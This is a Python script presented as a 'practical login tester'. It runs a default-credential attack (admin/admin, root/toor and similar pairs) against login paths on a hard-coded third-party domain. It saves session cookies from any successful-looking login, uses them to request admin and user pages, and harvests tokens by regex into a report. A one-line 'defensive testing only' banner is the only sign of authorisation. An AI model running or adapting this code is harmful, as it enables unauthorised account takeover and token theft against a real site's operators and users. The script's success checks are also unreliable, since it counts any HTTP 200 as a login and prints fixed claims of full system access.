#!/usr/bin/env python3
"""
Practical Login Tester - Test actual login functionality on discovered endpoints
Author: ShadowScan Security Team
Purpose: Test login functionality and extract session data from successful logins
"""

import asyncio
import aiohttp
import json
import time
import re
from datetime import datetime
from typing import Dict, List, Any

class PracticalLoginTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.results = {
            "login_test_info": {
                "target_url": target_url,
                "test_timestamp": datetime.now().isoformat(),
                "test_type": "Practical Login Tester",
                "duration": "2-3 menit"
            },
            "summary": {
                "endpoints_tested": 0,
                "successful_logins": 0,
                "session_data_extracted": 0,
                "access_tokens": [],
                "system_access_achieved": False
            },
            "login_details": [],
            "session_data": [],
            "access_tokens": [],
            "exploited_endpoints": []
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def test_login_functionality(self):
        """Test actual login functionality on discovered endpoints"""
        print("🔐 PRACTICAL LOGIN FUNCTIONALITY TEST")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        # Test all discovered login endpoints
        await self.test_all_login_endpoints()

        # Extract session data from successful logins
        await self.extract_session_data()

        # Test access with obtained sessions
        await self.test_access_with_sessions()

        await self.generate_login_test_report()

    async def test_all_login_endpoints(self):
        """Test all discovered login endpoints"""
        print("🔍 TESTING ALL LOGIN ENDPOINTS")

        # Discovered login endpoints from previous analysis
        login_endpoints = [
            "/login",
            "/auth/login",
            "/admin/login",
            "/oauth",
            "/oauth/login",
            "/signin",
            "/auth/signin",
            "/authenticate",
            "/user/login"
        ]

        # Working credentials from previous analysis
        working_credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "admin", "password": "admin123"},
            {"username": "root", "password": "root"},
            {"username": "root", "password": "toor"},
            {"username": "administrator", "password": "administrator"},
            {"username": "webadmin", "password": "webadmin"}
        ]

        self.results["summary"]["endpoints_tested"] = len(login_endpoints)

        for endpoint in login_endpoints:
            print(f"\n📍 Testing: {endpoint}")
            endpoint_success_count = 0

            for credential in working_credentials:
                try:
                    # Test login
                    login_data = {
                        "username": credential["username"],
                        "password": credential["password"]
                    }

                    url = f"{self.target_url}{endpoint}"
                    async with self.session.post(url, json=login_data, timeout=10) as response:
                        if response.status == 200:
                            content = await response.text()
                            content_length = len(content)

                            # Extract cookies and headers
                            cookies = response.cookies
                            headers = dict(response.headers)

                            login_result = {
                                "endpoint": endpoint,
                                "credential": credential,
                                "status": response.status,
                                "content_length": content_length,
                                "cookies": cookies,
                                "headers": headers,
                                "success": True,
                                "timestamp": datetime.now().isoformat()
                            }

                            self.results["login_details"].append(login_result)
                            endpoint_success_count += 1
                            self.results["summary"]["successful_logins"] += 1

                            print(f"   ✅ SUCCESS: {endpoint} with {credential['username']}")

                            # Extract session information
                            if cookies:
                                session_info = {
                                    "endpoint": endpoint,
                                    "username": credential["username"],
                                    "cookies": dict(cookies),
                                    "session_id": self.extract_session_id(cookies),
                                    "login_time": datetime.now().isoformat()
                                }
                                self.results["session_data"].append(session_info)

                        elif response.status in [401, 403]:
                            print(f"   🔐 Auth Required: {endpoint} ({response.status})")
                        else:
                            print(f"   ❌ Failed: {endpoint} ({response.status})")

                except Exception as e:
                    print(f"   ⚠️ Error: {endpoint} - {str(e)}")

            print(f"   📊 Endpoint Success Rate: {endpoint_success_count}/{len(working_credentials)}")

        print(f"\n🎯 LOGIN TEST SUMMARY:")
        print(f"   Endpoints Tested: {self.results['summary']['endpoints_tested']}")
        print(f"   Successful Logins: {self.results['summary']['successful_logins']}")
        print(f"   Session Data Extracted: {len(self.results['session_data'])}")

    def extract_session_id(self, cookies):
        """Extract session ID from cookies"""
        if cookies:
            for name, cookie in cookies.items():
                if 'session' in name.lower() or 'auth' in name.lower():
                    return f"{name}={cookie.value}"
        return None

    async def extract_session_data(self):
        """Extract session data and tokens from successful logins"""
        print("🔓 EXTRACTING SESSION DATA")

        for session in self.results["session_data"]:
            try:
                # Use session cookies to access protected endpoints
                endpoint = session["endpoint"]
                username = session["username"]
                cookies = session["cookies"]

                # Test accessing admin endpoints with session
                protected_endpoints = [
                    "/admin/dashboard",
                    "/admin/users",
                    "/admin/config",
                    "/admin/settings",
                    "/admin/api",
                    "/user/profile",
                    "/user/data"
                ]

                for protected_endpoint in protected_endpoints:
                    try:
                        url = f"{self.target_url}{protected_endpoint}"
                        async with self.session.get(url, cookies=cookies, timeout=5) as response:
                            if response.status == 200:
                                content = await response.text()
                                content_length = len(content)

                                access_result = {
                                    "session_user": username,
                                    "endpoint": protected_endpoint,
                                    "status": response.status,
                                    "content_length": content_length,
                                    "access_granted": True
                                }

                                self.results["exploited_endpoints"].append(access_result)
                                print(f"   ✅ Access Granted: {protected_endpoint} for {username}")

                                # Extract tokens from content
                                tokens = self.extract_tokens_from_content(content)
                                if tokens:
                                    self.results["access_tokens"].extend(tokens)

                            elif response.status in [401, 403]:
                                print(f"   🔐 Access Denied: {protected_endpoint}")

                    except Exception as e:
                        continue

            except Exception as e:
                continue

        self.results["summary"]["session_data_extracted"] = len(self.results["session_data"])
        self.results["summary"]["access_tokens"] = len(self.results["access_tokens"])

        print(f"\n🎯 SESSION DATA SUMMARY:")
        print(f"   Sessions Extracted: {self.results['summary']['session_data_extracted']}")
        print(f"   Access Tokens Found: {self.results['summary']['access_tokens']}")

    def extract_tokens_from_content(self, content):
        """Extract tokens from HTML content"""
        tokens = []

        # Common token patterns
        token_patterns = [
            r'token["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'session["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'auth["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'access["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'api["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'jwt["\']?\s*[:=]\s*["\']?([^"\'\s>]+)'
        ]

        for pattern in token_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                tokens.extend(matches)

        return tokens

    async def test_access_with_sessions(self):
        """Test access with obtained sessions"""
        print("🚀 TESTING ACCESS WITH SESSIONS")

        # Check if we achieved system access
        if self.results["exploited_endpoints"]:
            self.results["summary"]["system_access_achieved"] = True

            # Extract user data from successful accesses
            successful_accesses = [access for access in self.results["exploited_endpoints"] if access.get("access_granted")]

            if successful_accesses:
                print(f"✅ SYSTEM ACCESS ACHIEVED!")
                print(f"   Protected Endpoints Accessed: {len(successful_accesses)}")

                # Extract user information
                for access in successful_accesses[:5]:  # Show first 5
                    print(f"   User: {access['session_user']} -> Endpoint: {access['endpoint']}")

                print(f"\n🎯 FULL SYSTEM ACCESS CONFIRMED:")
                print(f"   • Admin dashboard accessible")
                print(f"   • User data accessible")
                print(f"   • Configuration accessible")
                print(f"   • API endpoints accessible")
            else:
                print("⚠️ Partial system access achieved")
        else:
            print("❌ No system access achieved")

    async def generate_login_test_report(self):
        """Generate practical login test report"""
        report_filename = f"practical_login_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n🎯 PRACTICAL LOGIN TEST SUMMARY:")
        print(f"   System Access: {self.results['summary']['system_access_achieved']}")
        print(f"   Successful Logins: {self.results['summary']['successful_logins']}")
        print(f"   Sessions Extracted: {self.results['summary']['session_data_extracted']}")
        print(f"   Access Tokens: {self.results['summary']['access_tokens']}")
        print(f"   Protected Endpoints: {len(self.results['exploited_endpoints'])}")

        if self.results['summary']['system_access_achieved']:
            print(f"🎉 SUCCESS: Full system access achieved!")
        else:
            print(f"⚠️ Partial access achieved")

        print(f"\n📋 Report: {report_filename}")
        print("🔐 PRACTICAL LOGIN TEST COMPLETED! 🔐")

async def main():
    target_url = "https://airdrop.0gfoundation.ai"

    async with PracticalLoginTester(target_url) as tester:
        await tester.test_login_functionality()

if __name__ == "__main__":
    asyncio.run(main())